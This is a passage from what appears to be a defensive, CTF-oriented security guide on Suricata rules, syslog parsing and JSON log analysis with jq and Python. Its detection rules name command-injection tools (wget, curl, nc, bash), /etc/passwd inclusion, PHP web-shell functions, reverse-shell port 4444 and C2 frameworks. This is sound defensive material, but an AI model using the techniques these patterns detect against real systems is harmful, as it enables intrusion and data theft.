alert tcp any any -> any any (msg:"Alert After 5 Attempts"; \
    threshold:type threshold, track by_src, count 5, seconds 10; sid:81;)

# Threshold - alert on every X occurrences
alert tcp any any -> any any (msg:"Alert Every 10th"; \
    threshold:type both, track by_src, count 10, seconds 60; sid:82;)

# Detection filter (suppress before alerting)
alert tcp any any -> any 22 (msg:"SSH After Multiple Attempts"; \
    detection_filter:track by_src, count 5, seconds 60; sid:83;)
```

**Metadata and Classification:**

```bash
# Complete rule with metadata
alert http any any -> any any ( \
    msg:"SQL Injection in URI"; \
    flow:established,to_server; \
    http.uri; \
    pcre:"/union.*select|insert.*into/i"; \
    classtype:web-application-attack; \
    priority:1; \
    reference:url,owasp.org/www-community/attacks/SQL_Injection; \
    metadata:attack_target Server, deployment Datacenter; \
    sid:1000100; \
    rev:2; \
)

# Classification types:
# attempted-admin, attempted-user, web-application-attack,
# successful-admin, successful-user, trojan-activity,
# policy-violation, protocol-command-decode, shellcode-detect,
# misc-attack, network-scan, denial-of-service
```

### Analyzing Suricata Logs

**Suricata Log Files:**

```
eve.json        - Main event log (JSON format)
fast.log        - Fast alert log (text)
stats.log       - Statistics log
suricata.log    - Engine log
http.log        - HTTP transactions
dns.log         - DNS queries
tls.log         - TLS/SSL connections
files.log       - File transfers
fileinfo        - Extracted files directory
```

**eve.json Analysis:**

```bash
# View all alerts
jq 'select(.event_type=="alert")' /var/log/suricata/eve.json

# Count alerts by signature
jq -r 'select(.event_type=="alert") | .alert.signature' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# Alerts by source IP
jq -r 'select(.event_type=="alert") | .src_ip' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# Alerts by severity
jq -r 'select(.event_type=="alert") | .alert.severity' /var/log/suricata/eve.json | \
    sort | uniq -c

# High severity alerts only
jq 'select(.event_type=="alert" and .alert.severity==1)' /var/log/suricata/eve.json

# Alerts with payload
jq 'select(.event_type=="alert" and .payload)' /var/log/suricata/eve.json | \
    jq -r '.payload' | base64 -d

# Specific signature ID
jq 'select(.alert.signature_id==1000001)' /var/log/suricata/eve.json

# Time range filtering
jq 'select(.timestamp>="2025-10-19T08:00:00" and .timestamp<="2025-10-19T17:00:00")' \
    /var/log/suricata/eve.json

# Extract unique alert signatures
jq -r 'select(.event_type=="alert") | .alert.signature' /var/log/suricata/eve.json | \
    sort -u

# Alert statistics by category
jq -r 'select(.event_type=="alert") | .alert.category' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn
```

**HTTP Analysis from eve.json:**

```bash
# All HTTP events
jq 'select(.event_type=="http")' /var/log/suricata/eve.json

# HTTP methods distribution
jq -r 'select(.event_type=="http") | .http.http_method' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# HTTP status codes
jq -r 'select(.event_type=="http") | .http.status' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# POST requests with large bodies
jq 'select(.event_type=="http" and .http.http_method=="POST" and .http.length>10000)' \
    /var/log/suricata/eve.json

# Suspicious user agents
jq -r 'select(.event_type=="http") | .http.http_user_agent' /var/log/suricata/eve.json | \
    grep -iE "(nikto|sqlmap|nmap)" | sort -u

# URLs accessed
jq -r 'select(.event_type=="http") | "\(.http.hostname)\(.http.url)"' \
    /var/log/suricata/eve.json | sort -u
```

**DNS Analysis from eve.json:**

```bash
# DNS queries
jq 'select(.event_type=="dns")' /var/log/suricata/eve.json

# Top queried domains
jq -r 'select(.event_type=="dns") | .dns.rrname' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn | head -20

# NXDOMAIN responses
jq 'select(.event_type=="dns" and .dns.rcode=="NXDOMAIN")' /var/log/suricata/eve.json

# Long DNS queries (potential tunneling)
jq 'select(.event_type=="dns" and (.dns.rrname|length)>50)' /var/log/suricata/eve.json

# TXT record queries
jq 'select(.event_type=="dns" and .dns.rrtype=="TXT")' /var/log/suricata/eve.json
```

**TLS Analysis from eve.json:**

```bash
# TLS events
jq 'select(.event_type=="tls")' /var/log/suricata/eve.json

# TLS versions
jq -r 'select(.event_type=="tls") | .tls.version' /var/log/suricata/eve.json | \
    sort | uniq -c

# SNI values
jq -r 'select(.event_type=="tls") | .tls.sni' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# Certificate subjects
jq -r 'select(.event_type=="tls") | .tls.subject' /var/log/suricata/eve.json | \
    sort -u

# Certificate issuers
jq -r 'select(.event_type=="tls") | .tls.issuerdn' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# JA3 hashes (if enabled)
jq -r 'select(.event_type=="tls") | .tls.ja3.hash' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn
```

**File Extraction Analysis:**

```bash
# Files logged
jq 'select(.event_type=="fileinfo")' /var/log/suricata/eve.json

# Files by type
jq -r 'select(.event_type=="fileinfo") | .fileinfo.magic' /var/log/suricata/eve.json | \
    sort | uniq -c | sort -rn

# Executable files
jq 'select(.event_type=="fileinfo" and .fileinfo.magic|contains("executable"))' \
    /var/log/suricata/eve.json

# Files with MD5/SHA256
jq -r 'select(.event_type=="fileinfo") | "\(.fileinfo.md5) \(.fileinfo.sha256)"' \
    /var/log/suricata/eve.json | grep -v "null"

# List extracted files
ls -lh /var/log/suricata/fileinfo/
```

### Custom Suricata Rules for CTF

**Data Exfiltration Detection:**

```bash
# Base64 in HTTP POST
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Base64 Data in POST"; \
    flow:established,to_server; \
    http.method; content:"POST"; \
    http.request_body; \
    pcre:"/[A-Za-z0-9+\/=]{100,}/"; \
    classtype:policy-violation; \
    sid:2000001; rev:1; \
)

# DNS tunneling pattern
alert dns $HOME_NET any -> any 53 ( \
    msg:"Potential DNS Tunneling - Long Query"; \
    dns.query; \
    content_len:>50; \
    threshold:type both, track by_src, count 10, seconds 60; \
    classtype:policy-violation; \
    sid:2000002; rev:1; \
)

# ICMP tunneling
alert icmp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"ICMP Data Exfiltration"; \
    itype:8; \
    dsize:>100; \
    content:"|00 01 02 03|"; \
    classtype:policy-violation; \
    sid:2000003; rev:1; \
)

# Large outbound HTTP POST
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Large HTTP POST - Possible Exfiltration"; \
    flow:established,to_server; \
    http.method; content:"POST"; \
    http.content_len; \
    byte_test:4,>,100000,0,string,dec; \
    classtype:policy-violation; \
    sid:2000004; rev:1; \
)
```

**Web Attack Detection:**

```bash
# SQL injection comprehensive
alert http any any -> $HOME_NET any ( \
    msg:"SQL Injection Attempt - Multiple Keywords"; \
    flow:established,to_server; \
    http.uri; \
    pcre:"/(\bunion\b.*\bselect\b|\binsert\b.*\binto\b|\bupdate\b.*\bset\b|\bdelete\b.*\bfrom\b)/i"; \
    classtype:web-application-attack; \
    sid:2000010; rev:1; \
)

# XSS attempt
alert http any any -> $HOME_NET any ( \
    msg:"XSS Attempt in URI"; \
    flow:established,to_server; \
    http.uri; \
    pcre:"/<script[^>]*>|javascript:|onerror\s*=|onload\s*=/i"; \
    classtype:web-application-attack; \
    sid:2000011; rev:1; \
)

# Command injection
alert http any any -> $HOME_NET any ( \
    msg:"Command Injection Attempt"; \
    flow:established,to_server; \
    http.uri; \
    pcre:"/;.*?(cat|wget|curl|bash|sh|nc|netcat|python|perl)/i"; \
    classtype:web-application-attack; \
    sid:2000012; rev:1; \
)

# Local File Inclusion
alert http any any -> $HOME_NET any ( \
    msg:"Local File Inclusion Attempt"; \
    flow:established,to_server; \
    http.uri; \
    pcre:"/(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c).*(etc\/passwd|boot\.ini|win\.ini)/i"; \
    classtype:web-application-attack; \
    sid:2000013; rev:1; \
)

# PHP shell upload
alert http any any -> $HOME_NET any ( \
    msg:"Potential PHP Shell Upload"; \
    flow:established,to_server; \
    http.method; content:"POST"; \
    http.request_body; \
    pcre:"/(eval|base64_decode|system|exec|shell_exec|passthru)\s*\(/i"; \
    classtype:web-application-attack; \
    sid:2000014; rev:1; \
)
```

**Malware and C2 Detection:**

```bash
# Metasploit user agent
alert http any any -> any any ( \
    msg:"Metasploit User-Agent Detected"; \
    flow:established; \
    http.user_agent; \
    content:"Metasploit"; \
    classtype:trojan-activity; \
    sid:2000020; rev:1; \
)

# Empire C2 pattern
alert http any any -> any any ( \
    msg:"Empire C2 Communication Pattern"; \
    flow:established; \
    content:"session="; \
    http.uri; content:"/admin/get.php"; \
    classtype:trojan-activity; \
    sid:2000021; rev:1; \
)

# Cobalt Strike beacon
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Potential Cobalt Strike Beacon"; \
    flow:established,to_server; \
    dsize:<200; \
    threshold:type both, track by_src, count 5, seconds 60; \
    classtype:trojan-activity; \
    sid:2000022; rev:1; \
)

# Reverse shell on common port
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 ( \
    msg:"Possible Reverse Shell Connection"; \
    flow:established,to_server; \
    classtype:trojan-activity; \
    sid:2000023; rev:1; \
)
```

**Reconnaissance Detection:**

```bash
# Port scan - multiple SYN to different ports
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"Potential Port Scan"; \
    flags:S,12; \
    threshold:type both, track by_src, count 20, seconds 10; \
    classtype:attempted-recon; \
    sid:2000030; rev:1; \
)

# Null scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"TCP Null Scan Detected"; \
    flags:0; \
    classtype:attempted-recon; \
    sid:2000031; rev:1; \
)

# XMAS scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"TCP XMAS Scan Detected"; \
    flags:FPU; \
    classtype:attempted-recon; \
    sid:2000032; rev:1; \
)

# Directory enumeration
alert http any any -> $HOME_NET any ( \
    msg:"Web Directory Enumeration"; \
    flow:established,to_server; \
    http.stat_code; content:"404"; \
    threshold:type both, track by_src, count 20, seconds 30; \
    classtype:attempted-recon; \
    sid:2000033; rev:1; \
)
```

### Rule Testing and Validation

**Testing Rules:**

```bash
# Test rule syntax
suricata -T -c /etc/suricata/suricata.yaml -S custom.rules

# Test against PCAP
suricata -r test.pcap -S custom.rules -l ./test_output/

# Check for triggered alerts
cat ./test_output/fast.log

# Detailed JSON output
jq 'select(.event_type=="alert")' ./test_output/eve.json

# Rule performance testing
suricata --engine-analysis -r capture.pcap -l ./analysis/
cat ./analysis/rules_fast_pattern.txt
```

**Rule Optimization:**

```bash
# Use fast_pattern for content matching
alert http any any -> any any ( \
    msg:"Optimized Rule"; \
    content:"keyword1"; fast_pattern; \
    content:"keyword2"; \
    sid:3000001; \
)

# Limit regex scope with content pre-filter
alert http any any -> any any ( \
    msg:"Pre-filtered Regex"; \
    content:"suspicious"; nocase; \
    pcre:"/suspicious.*pattern/i"; \
    sid:3000002; \
)

# Use protocol-specific keywords
alert http any any -> any any ( \
    msg:"HTTP Specific"; \
    http.uri; content:"/admin"; \
    http.method; content:"POST"; \
    sid:3000003; \
)
```

---

## Syslog Parsing

### Syslog Format and Structure

**Syslog Message Format (RFC 3164):**

```
<Priority>Timestamp Hostname Process[PID]: Message

Example:
<34>Oct 19 12:30:45 webserver01 sshd[12345]: Failed password for root from 203.0.113.50
```

**Priority Calculation:**

```
Priority = Facility * 8 + Severity

Facilities:
0  - kernel
1  - user-level
2  - mail
3  - system daemon
4  - security/authorization
5  - syslogd internal
6  - line printer
7  - network news
8  - UUCP
16 - local0 through local7 (16-23)

Severities:
0 - Emergency
1 - Alert
2 - Critical
3 - Error
4 - Warning
5 - Notice
6 - Informational
7 - Debug
```

### Parsing Syslog with Command-Line Tools

**Basic Syslog Analysis:**

```bash
# View system logs
tail -f /var/log/syslog
tail -f /var/log/messages  # On some systems

# Filter by severity (error and above)
grep -E "(error|crit|alert|emerg)" /var/log/syslog

# Filter by service
grep "sshd" /var/log/auth.log
grep "apache" /var/log/apache2/error.log

# Time range filtering
awk '/Oct 19 08:00/,/Oct 19 17:00/' /var/log/syslog

# Count messages by hour
awk '{print $1, $2, $3}' /var/log/syslog | cut -d':' -f1 | uniq -c

# Extract failed SSH attempts
grep "Failed password" /var/log/auth.log

# Count failed attempts by IP
grep "Failed password" /var/log/auth.log | \
    grep -oP 'from \K[0-9.]+' | sort | uniq -c | sort -rn

# Successful SSH logins
grep "Accepted" /var/log/auth.log

# sudo commands executed
grep "sudo:" /var/log/auth.log | grep "COMMAND"
```

**Advanced Syslog Parsing:**

```bash
# Extract source IPs from auth failures
awk '/Failed password/{print $(NF-3)}' /var/log/auth.log | sort | uniq -c | sort -rn

# Parse Apache access logs
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Extract user agents from Apache
awk -F'"' '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Parse firewall logs (iptables)
grep "DPT=" /var/log/kern.log | \
    grep -oP 'SRC=\K[^ ]+|DPT=\K[^ ]+' | \
    paste - - | sort | uniq -c | sort -rn

# Extract specific fields
awk -F'[ :]' '/sshd/{print $1, $2, $3, $7, $NF}' /var/log/auth.log

# Convert syslog timestamps to epoch
awk '{cmd="date -d\""$1" "$2" "$3"\" +%s"; cmd | getline epoch; close(cmd); print epoch, $0}' \
    /var/log/syslog
```

### Using rsyslog for Advanced Filtering

**rsyslog Configuration:**

```bash
# Configuration file
/etc/rsyslog.conf
/etc/rsyslog.d/*.conf

# Basic template
$template CustomFormat,"%TIMESTAMP% %HOSTNAME% %syslogtag%%msg%\n"

# Filter by facility and severity
auth,authpriv.* /var/log/auth.log
*.*;auth,authpriv.none -/var/log/syslog
kern.* -/var/log/kern.log
mail.* -/var/log/mail.log

# Custom filters
:msg, contains, "Failed password" /var/log/ssh_failed.log
:hostname, isequal, "webserver01" /var/log/webserver01.log
:fromhost-ip, startswith, "192.168.1." /var/log/internal.log

# Program-based filtering
:programname, isequal, "sshd" /var/log/ssh.log
:programname, isequal, "apache2" /var/log/apache_syslog.log

# Forward to remote server
*.* @@remote-server:514  # TCP
*.* @remote-server:514   # UDP

# Output to JSON
$template json,"{\"timestamp\":\"%timestamp:::date-rfc3339%\",\"host\":\"%hostname%\",\"severity\":\"%syslogseverity-text%\",\"facility\":\"%syslogfacility-text%\",\"program\":\"%programname%\",\"message\":\"%msg:::json%\"}\n"
*.* /var/log/json.log;json
```

**Testing rsyslog Configuration:**

```bash
# Test configuration syntax
rsyslogd -N1

# Restart rsyslog
systemctl restart rsyslog

# Check status
systemctl status rsyslog

# Debug mode
rsyslogd -dn

# Send test message
logger -p auth.info "Test message from logger"
```

### Syslog Analysis Scripts

**Failed Login Analysis:**

```bash
#!/bin/bash
# analyze_failed_logins.sh

LOG_FILE="/var/log/auth.log"
THRESHOLD=5

echo "=== Failed SSH Login Analysis ==="
echo

echo "Top Failed Login Attempts by IP:"
grep "Failed password" $LOG_FILE | \
    grep -oP 'from \K[0-9.]+' | \
    sort | uniq -c | sort -rn | head -20

echo -e "\nIPs Exceeding Threshold ($THRESHOLD attempts):"
grep "Failed password" $LOG_FILE | \
    grep -oP 'from \K[0-9.]+' | \
    sort | uniq -c | \
    awk -v threshold=$THRESHOLD '$1 > threshold {print $2, ":", $1, "attempts"}'

echo -e "\nFailed Logins by Username:"
grep "Failed password for" $LOG_FILE | \
    awk '{for(i=1;i<=NF;i++) if($i=="for") print $(i+1)}' | \
    sort | uniq -c | sort -rn | head -10

echo -e "\nFailed Logins Timeline (last 100):"
grep "Failed password" $LOG_FILE | tail -100 | \
    awk '{print $1, $2, $3, $(NF-3)}'
```

**Apache Log Parser:**

```bash
#!/bin/bash
# parse_apache_logs.sh

ACCESS_LOG="/var/log/apache2/access.log"
ERROR_LOG="/var/log/apache2/error.log"

echo "=== Apache Access Log Analysis ==="

echo "Top Client IPs:"
awk '{print $1}' $ACCESS_LOG | sort | uniq -c | sort -rn | head -20

echo -e "\nHTTP Status Code Distribution:"
awk '{print $9}' $ACCESS_LOG | sort | uniq -c | sort -rn

echo -e "\nTop Requested URLs:"
awk '{print $7}' $ACCESS_LOG | sort | uniq -c | sort -rn | head -30

echo -e "\nTop User Agents:"
awk -F'"' '{print $6}' $ACCESS_LOG | sort | uniq -c | sort -rn | head -20

echo -e "\n4xx Errors:"
awk '$9 ~ /^4/ {print $9, $7}' $ACCESS_LOG | sort | uniq -c | sort -rn

echo -e "\n5xx Errors:"
awk '$9 ~ /^5/ {print $9, $7}' $ACCESS_LOG | sort | uniq -c | sort -rn

echo -e "\n=== Apache Error Log Analysis ==="
if [ -f $ERROR_LOG ]; then
    echo "Error Types:"
    awk -F'[][]' '{print $4}' $ERROR_LOG | sort | uniq -c | sort -rn | head -10
fi
```

**Security Event Correlation:**

```bash
#!/bin/bash
# correlate_security_events.sh

AUTH_LOG="/var/log/auth.log"
SYSLOG="/var/log/syslog"

echo "=== Security Event Correlation ==="

# Collect suspicious IPs from various sources
declare -A suspicious_ips

# Failed SSH attempts
while read -r ip; do
    ((suspicious_ips[$ip]++))
done < <(grep "Failed password" $AUTH_LOG | grep -oP 'from \K[0-9.]+')

# Port scan attempts (if logged)
while read -r ip; do
    ((suspicious_ips[$ip]+=5))  # Weight port scans higher
done < <(grep -i "port.*scan" $SYSLOG | grep -oP '\b[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b')

# Firewall blocks
while read -r ip; do
    ((suspicious_ips[$ip]+=2))
done < <(grep "BLOCK" $SYSLOG | grep -oP 'SRC=\K[0-9.]+')

# Output sorted by score
echo "Suspicious IPs by Score:"
for ip in "${!suspicious_ips[@]}"; do
    echo "${suspicious_ips[$ip]} $ip"
done | sort -rn | head -20
```

### Centralized Syslog Server Setup

**Configuring Syslog Server:**

```bash
# /etc/rsyslog.conf on server

# Enable UDP reception
module(load="imudp")
input(type="imudp" port="514")

# Enable TCP reception
module(load="imtcp")
input(type="imtcp" port="514")

# Template for remote logs
$template RemoteLogs,"/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log"
*.* ?RemoteLogs

# JSON output template
$template jsonFormat,"{\"@timestamp\":\"%timestamp:::date-rfc3339%\",\"host\":\"%hostname%\",\"severity\":\"%syslogseverity%\",\"facility\":\"%syslogfacility%\",\"program\":\"%programname%\",\"message\":\"%msg:::json%\"}\n"
*.* /var/log/remote/all.json;jsonFormat
```

**Client Configuration:**

```bash
# /etc/rsyslog.conf on clients

# Forward all logs to central server
*.* @@log-server:514  # TCP
*.* @log-server:514   # UDP

# Forward specific logs
auth,authpriv.* @@log-server:514
kern.* @@log-server:514
```

---

## JSON Log Processing

### JSON Log Format Standards

**Common JSON Log Structures:**

```json
// Generic application log
{
  "timestamp": "2025-10-19T12:30:45.123Z",
  "level": "ERROR",
  "service": "web-api",
  "message": "Database connection failed",
  "context": {
    "user_id": "12345",
    "request_id": "abc-def-ghi",
    "ip_address": "192.168.1.100"
  }
}

// Web server access log
{
  "timestamp": "2025-10-19T12:30:45Z",
  "remote_addr": "203.0.113.50",
  "request_method": "POST",
  "request_uri": "/api/login",
  "status": 200,
  "body_bytes_sent": 1234,
  "http_referer": "https://example.com",
  "http_user_agent": "Mozilla/5.0...",
  "request_time": 0.123
}

// Security event log
{
  "timestamp": "2025-10-19T12:30:45.000Z",
  "event_type": "authentication_failure",
  "source_ip": "203.0.113.50",
  "destination_ip": "192.168.1.10",
  "username": "admin",
  "service": "ssh",
  "severity": "high"
}
```

### Parsing JSON Logs with jq

**Basic jq Operations:**

```bash
# Pretty print JSON
jq '.' logfile.json

# Extract specific field
jq '.timestamp' logfile.json

# Extract multiple fields
jq '{time: .timestamp, ip: .source_ip, event: .event_type}' logfile.json

# Filter by field value
jq 'select(.level=="ERROR")' logfile.json

# Filter by numeric comparison
jq 'select(.status >= 400)' logfile.json

# Filter by string matching
jq 'select(.message | contains("failed"))' logfile.json

# Filter by regex
jq 'select(.user_agent | test("bot|crawler"; "i"))' logfile.json

# Array operations
jq '.events[]' logfile.json

# Array length

jq '.events | length' logfile.json

# First/last elements

jq '.events[0]' logfile.json jq '.events[-1]' logfile.json

# Slice array

jq '.events[0:10]' logfile.json
````

**Advanced jq Queries:**

```bash
# Multiple conditions
jq 'select(.level=="ERROR" and .service=="web-api")' logfile.json

# OR conditions
jq 'select(.status==404 or .status==500)' logfile.json

# Nested field access
jq '.context.user_id' logfile.json

# Check for field existence
jq 'select(.context.user_id != null)' logfile.json

# Group and count
jq -s 'group_by(.level) | map({level: .[0].level, count: length})' logfile.json

# Top N values
jq -s 'group_by(.source_ip) | map({ip: .[0].source_ip, count: length}) | 
       sort_by(.count) | reverse | .[0:10]' logfile.json

# Calculate statistics
jq -s 'map(.request_time) | add / length' logfile.json  # Average

# Time range filtering
jq 'select(.timestamp >= "2025-10-19T08:00:00" and 
           .timestamp <= "2025-10-19T17:00:00")' logfile.json

# Extract and format
jq -r '"\(.timestamp) - \(.source_ip) - \(.message)"' logfile.json

# Convert to CSV
jq -r '[.timestamp, .source_ip, .status] | @csv' logfile.json

# Unique values
jq -r '.source_ip' logfile.json | sort -u

# Aggregate by field
jq -s 'group_by(.status) | 
       map({status: .[0].status, count: length, 
            ips: [.[].source_ip] | unique})' logfile.json
````

**jq Streaming for Large Files:**

```bash
# Process large files without loading into memory
jq -c 'select(.level=="ERROR")' large_logfile.json

# Count records efficiently
jq -s 'length' logfile.json

# Stream processing with --stream
jq --stream 'select(length==2 and .[0][0]=="level" and .[1]=="ERROR")' logfile.json
```

### JSON Log Analysis Scripts

**Security Event Analyzer:**

```bash
#!/bin/bash
# analyze_json_security_logs.sh

LOGFILE="$1"

if [ -z "$LOGFILE" ]; then
    echo "Usage: $0 <json_logfile>"
    exit 1
fi

echo "=== JSON Security Log Analysis ==="
echo

echo "Event Type Distribution:"
jq -r '.event_type' "$LOGFILE" | sort | uniq -c | sort -rn

echo -e "\nTop Source IPs:"
jq -r '.source_ip' "$LOGFILE" | sort | uniq -c | sort -rn | head -20

echo -e "\nFailed Authentication Attempts:"
jq -c 'select(.event_type=="authentication_failure")' "$LOGFILE" | \
    jq -r '[.timestamp, .source_ip, .username] | @tsv' | column -t

echo -e "\nHigh Severity Events:"
jq -c 'select(.severity=="high" or .severity=="critical")' "$LOGFILE" | \
    jq -r '[.timestamp, .event_type, .source_ip, .message] | @tsv' | column -t

echo -e "\nUnique Usernames Attempted:"
jq -r 'select(.event_type=="authentication_failure") | .username' "$LOGFILE" | \
    sort -u

echo -e "\nEvents by Hour:"
jq -r '.timestamp' "$LOGFILE" | cut -d'T' -f2 | cut -d':' -f1 | \
    sort | uniq -c

echo -e "\nCorrelated Events (same source, multiple attempts):"
jq -s 'group_by(.source_ip) | 
       map(select(length > 5) | {ip: .[0].source_ip, count: length, 
           events: [.[].event_type] | unique})' "$LOGFILE"
```

**Web Application Log Analyzer:**

```bash
#!/bin/bash
# analyze_web_logs.sh

LOGFILE="$1"

echo "=== Web Application Log Analysis ==="

echo "HTTP Status Code Distribution:"
jq -r '.status' "$LOGFILE" | sort | uniq -c | sort -rn

echo -e "\nTop Requested Endpoints:"
jq -r '.request_uri' "$LOGFILE" | sort | uniq -c | sort -rn | head -20

echo -e "\nSlowest Requests (>5 seconds):"
jq -c 'select(.request_time > 5)' "$LOGFILE" | \
    jq -r '[.timestamp, .request_uri, .request_time, .status] | @tsv' | \
    sort -k3 -rn | head -20

echo -e "\n4xx Errors:"
jq -c 'select(.status >= 400 and .status < 500)' "$LOGFILE" | \
    jq -r '[.remote_addr, .request_method, .request_uri, .status] | @tsv' | \
    sort | uniq -c | sort -rn

echo -e "\n5xx Errors:"
jq -c 'select(.status >= 500)' "$LOGFILE" | \
    jq -r '[.timestamp, .request_uri, .status] | @tsv'

echo -e "\nPOST Requests with Large Bodies:"
jq -c 'select(.request_method=="POST" and .body_bytes_sent > 10000)' "$LOGFILE" | \
    jq -r '[.remote_addr, .request_uri, .body_bytes_sent] | @tsv'

echo -e "\nSuspicious User Agents:"
jq -r '.http_user_agent' "$LOGFILE" | \
    grep -iE "(bot|crawler|scanner|sqlmap|nikto|nmap)" | \
    sort | uniq -c | sort -rn

echo -e "\nRequest Rate by IP:"
jq -s 'group_by(.remote_addr) | 
       map({ip: .[0].remote_addr, requests: length}) | 
       sort_by(.requests) | reverse | .[0:20]' "$LOGFILE"

echo -e "\nAverage Response Time:"
jq -s 'map(.request_time) | add / length' "$LOGFILE"
```

**CTF Flag Hunter:**

```bash
#!/bin/bash
# hunt_flags_json.sh

LOGFILE="$1"
FLAG_PATTERN="${2:-flag\{[^}]+\}|CTF\{[^}]+\}}"

echo "=== Flag Hunting in JSON Logs ==="

echo "Searching all string fields for flag patterns..."

# Search in all fields recursively
jq -r '.. | strings' "$LOGFILE" | grep -oP "$FLAG_PATTERN" | sort -u

echo -e "\nSearching specific fields:"

# Check common fields
echo "In messages:"
jq -r '.message // empty' "$LOGFILE" | grep -oP "$FLAG_PATTERN"

echo -e "\nIn request URIs:"
jq -r '.request_uri // empty' "$LOGFILE" | grep -oP "$FLAG_PATTERN"

echo -e "\nIn request bodies:"
jq -r '.request_body // empty' "$LOGFILE" | grep -oP "$FLAG_PATTERN"

echo -e "\nIn user agents:"
jq -r '.http_user_agent // empty' "$LOGFILE" | grep -oP "$FLAG_PATTERN"

echo -e "\nIn headers:"
jq -r '.headers // empty | to_entries[] | .value' "$LOGFILE" | grep -oP "$FLAG_PATTERN"

echo -e "\nBase64 encoded data:"
jq -r '.. | strings' "$LOGFILE" | grep -oP '[A-Za-z0-9+/=]{40,}' | while read enc; do
    decoded=$(echo "$enc" | base64 -d 2>/dev/null)
    if echo "$decoded" | grep -qP "$FLAG_PATTERN"; then
        echo "Found in: $enc"
        echo "Decoded: $decoded"
    fi
done

echo -e "\nHex encoded data:"
jq -r '.. | strings' "$LOGFILE" | grep -oP '[0-9A-Fa-f]{40,}' | while read hex; do
    decoded=$(echo "$hex" | xxd -r -p 2>/dev/null)
    if echo "$decoded" | grep -qP "$FLAG_PATTERN"; then
        echo "Found in: $hex"
        echo "Decoded: $decoded"
    fi
done
```

### Python JSON Log Processing

**Advanced JSON Analysis with Python:**

```python
#!/usr/bin/env python3
# json_log_analyzer.py

import json
import sys
from collections import Counter, defaultdict
from datetime import datetime

def load_json_logs(filename):
    """Load JSON logs from file (supports JSONL format)"""
    logs = []
    with open(filename, 'r') as f:
        for line in f:
            try:
                logs.append(json.loads(line.strip()))
            except json.JSONDecodeError:
                continue
    return logs

def analyze_logs(logs):
    """Perform comprehensive log analysis"""
    
    # Basic statistics
    print(f"Total log entries: {len(logs)}")
    
    # Event type distribution
    if any('event_type' in log for log in logs):
        event_types = Counter(log.get('event_type') for log in logs if 'event_type' in log)
        print("\n=== Event Type Distribution ===")
        for event, count in event_types.most_common(10):
            print(f"{event}: {count}")
    
    # Source IP analysis
    if any('source_ip' in log for log in logs):
        source_ips = Counter(log.get('source_ip') for log in logs if 'source_ip' in log)
        print("\n=== Top Source IPs ===")
        for ip, count in source_ips.most_common(20):
            print(f"{ip}: {count}")
    
    # Temporal analysis
    if any('timestamp' in log for log in logs):
        timestamps = [log['timestamp'] for log in logs if 'timestamp' in log]
        print(f"\n=== Temporal Analysis ===")
        print(f"First event: {min(timestamps)}")
        print(f"Last event: {max(timestamps)}")
        
        # Events by hour
        hours = defaultdict(int)
        for ts in timestamps:
            try:
                hour = datetime.fromisoformat(ts.replace('Z', '+00:00')).hour
                hours[hour] += 1
            except:
                continue
        
        print("\nEvents by Hour:")
        for hour in sorted(hours.keys()):
            print(f"{hour:02d}:00 - {hours[hour]}")
    
    # HTTP status code analysis
    if any('status' in log for log in logs):
        statuses = Counter(log.get('status') for log in logs if 'status' in log)
        print("\n=== HTTP Status Codes ===")
        for status, count in sorted(statuses.items()):
            print(f"{status}: {count}")
    
    # Failed authentication attempts
    failed_auth = [log for log in logs 
                   if log.get('event_type') == 'authentication_failure']
    if failed_auth:
        print(f"\n=== Failed Authentication Attempts ===")
        print(f"Total failures: {len(failed_auth)}")
        
        usernames = Counter(log.get('username') for log in failed_auth)
        print("\nTop attempted usernames:")
        for user, count in usernames.most_common(10):
            print(f"{user}: {count}")
        
        ips = Counter(log.get('source_ip') for log in failed_auth)
        print("\nTop source IPs for failed auth:")
        for ip, count in ips.most_common(10):
            print(f"{ip}: {count}")
    
    # Correlation: Multiple events from same source
    if any('source_ip' in log for log in logs):
        ip_events = defaultdict(list)
        for log in logs:
            if 'source_ip' in log and 'event_type' in log:
                ip_events[log['source_ip']].append(log['event_type'])
        
        suspicious = {ip: events for ip, events in ip_events.items() 
                     if len(events) > 10}
        
        if suspicious:
            print("\n=== Suspicious IPs (>10 events) ===")
            for ip, events in sorted(suspicious.items(), 
                                    key=lambda x: len(x[1]), 
                                    reverse=True)[:20]:
                unique_events = set(events)
                print(f"{ip}: {len(events)} events, "
                      f"{len(unique_events)} unique types")

def search_patterns(logs, pattern):
    """Search for specific patterns in logs"""
    import re
    regex = re.compile(pattern, re.IGNORECASE)
    
    results = []
    for log in logs:
        # Search all string values recursively
        def search_recursive(obj):
            if isinstance(obj, dict):
                for value in obj.values():
                    search_recursive(value)
            elif isinstance(obj, list):
                for item in obj:
                    search_recursive(item)
            elif isinstance(obj, str):
                if regex.search(obj):
                    results.append((log, obj))
        
        search_recursive(log)
    
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 json_log_analyzer.py <logfile> [search_pattern]")
        sys.exit(1)
    
    filename = sys.argv[1]
    logs = load_json_logs(filename)
    
    if len(sys.argv) > 2:
        pattern = sys.argv[2]
        results = search_patterns(logs, pattern)
        print(f"Found {len(results)} matches for pattern: {pattern}")
        for log, match in results[:50]:  # Show first 50
            print(f"\nTimestamp: {log.get('timestamp', 'N/A')}")
